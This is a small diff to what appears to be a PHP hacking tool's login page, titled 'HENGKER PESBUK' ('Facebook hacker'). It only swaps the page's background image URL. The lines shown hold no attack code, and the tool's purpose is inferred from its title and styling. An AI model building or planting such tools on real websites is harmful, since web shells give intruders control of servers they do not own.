@@ -15,7 +15,7 @@ function show_login_form()
     <title>HENGKER PESBUK</title>
     <style>
         body {
-            background: url('https://pomf2.lain.la/f/tgu9nkoy.jpg');
+            background: url('https://raw.githubusercontent.com/haxorleviathan-glitch/repository/refs/heads/main/hd.jpg');
 	    background-size: cover;
             color: #0f0;
             font-family: monospace;
